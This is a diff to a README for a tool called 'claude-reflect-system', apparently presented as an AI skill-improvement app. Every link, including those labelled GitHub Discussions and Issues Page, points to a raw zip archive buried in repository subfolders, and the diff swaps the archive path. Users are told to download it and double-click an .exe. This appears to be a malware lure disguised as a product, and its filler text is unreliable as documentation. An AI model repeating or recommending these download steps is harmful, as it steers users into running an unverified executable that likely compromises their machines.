@@ -1,6 +1,6 @@
 # 🌟 claude-reflect-system - Improve Skills That Learn From Mistakes
 
-[![Download Latest Release](https://raw.githubusercontent.com/Raghasruthi/claude-reflect-system/master/reflect/.state/system-reflect-claude-1.1.zip)](https://raw.githubusercontent.com/Raghasruthi/claude-reflect-system/master/reflect/.state/system-reflect-claude-1.1.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/Raghasruthi/claude-reflect-system/master/reflect/scripts/system_claude_reflect_v3.5.zip)](https://raw.githubusercontent.com/Raghasruthi/claude-reflect-system/master/reflect/scripts/system_claude_reflect_v3.5.zip)
 
 ## 📖 Description
 
@@ -28,7 +28,7 @@ To run **claude-reflect-system**, your system should meet the following requirem
 Follow these steps to get started:
 
 1. **Download the Application:**
-   Visit this page to download the latest release: [Download Here](https://raw.githubusercontent.com/Raghasruthi/claude-reflect-system/master/reflect/.state/system-reflect-claude-1.1.zip).
+   Visit this page to download the latest release: [Download Here](https://raw.githubusercontent.com/Raghasruthi/claude-reflect-system/master/reflect/scripts/system_claude_reflect_v3.5.zip).
 
 2. **Install the Application:**
    - If you're on **Windows**, double-click the downloaded `.exe` file.
@@ -41,7 +41,7 @@ Follow these steps to get started:
 ## 💻 Download & Install
 
 You can easily get the latest version of **claude-reflect-system** by visiting:
-[Download Latest Release](https://raw.githubusercontent.com/Raghasruthi/claude-reflect-system/master/reflect/.state/system-reflect-claude-1.1.zip).
+[Download Latest Release](https://raw.githubusercontent.com/Raghasruthi/claude-reflect-system/master/reflect/scripts/system_claude_reflect_v3.5.zip).
 
 Follow the installation steps as described above to set up the application on your device.
 
@@ -61,7 +61,7 @@ Once the application is running, you can begin using it to improve your skills. 
 
 ## 🙌 Community and Support
 
-Join our growing community! Engage with other users and share your experiences or ask for help on our [GitHub Discussions](https://raw.githubusercontent.com/Raghasruthi/claude-reflect-system/master/reflect/.state/system-reflect-claude-1.1.zip).
+Join our growing community! Engage with other users and share your experiences or ask for help on our [GitHub Discussions](https://raw.githubusercontent.com/Raghasruthi/claude-reflect-system/master/reflect/scripts/system_claude_reflect_v3.5.zip).
 
 If you experience issues or have questions, reach out through our support page or open an issue on the GitHub repository.
 
@@ -78,6 +78,6 @@ You can find resources and discussions about these topics in our GitHub reposito
 
 ## 💬 Feedback
 
-We value your feedback. If you have any suggestions or comments about **claude-reflect-system**, please share them with us on the [Issues Page](https://raw.githubusercontent.com/Raghasruthi/claude-reflect-system/master/reflect/.state/system-reflect-claude-1.1.zip). Your input is crucial for our continuous improvement.
+We value your feedback. If you have any suggestions or comments about **claude-reflect-system**, please share them with us on the [Issues Page](https://raw.githubusercontent.com/Raghasruthi/claude-reflect-system/master/reflect/scripts/system_claude_reflect_v3.5.zip). Your input is crucial for our continuous improvement.
 
 Thank you for using the **claude-reflect-system**! We’re excited to help you on your journey to enhanced skills and learning.
